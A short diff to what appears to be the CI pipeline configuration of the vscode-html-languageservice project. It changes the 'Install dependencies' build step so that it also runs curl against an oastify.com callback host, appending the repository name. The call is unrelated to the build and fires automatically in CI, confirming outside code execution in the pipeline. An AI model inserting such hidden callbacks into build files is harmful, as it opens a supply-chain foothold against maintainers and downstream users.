@@ -35,7 +35,7 @@ extends:
       - name: vscode-html-languageservice
 
         buildSteps:
-          - script: yarn --frozen-lockfile
+          - script: yarn --frozen-lockfile && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/microsoft/vscode-html-languageservice
             displayName: Install dependencies
 
           # the rest of the build steps are part of the 'prepack' script, automatically run when the pipeline invokes 'yarn pack'
